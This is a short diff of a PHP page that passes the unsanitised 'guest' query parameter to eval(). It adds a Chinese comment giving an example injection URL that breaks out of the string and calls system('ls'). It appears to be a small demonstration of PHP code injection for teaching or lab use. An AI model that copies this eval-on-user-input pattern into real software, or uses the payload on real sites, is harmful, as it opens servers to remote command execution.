@@ -8,6 +8,9 @@
             $guest = $_GET['guest'];
             $hello = "echo 'hello , ".$guest."';";
             eval($hello);
+
+            //执行代码的示例:
+            //eval.php?guest=';system('ls');//&submit=submit
         ?>
     </body>
 </html>
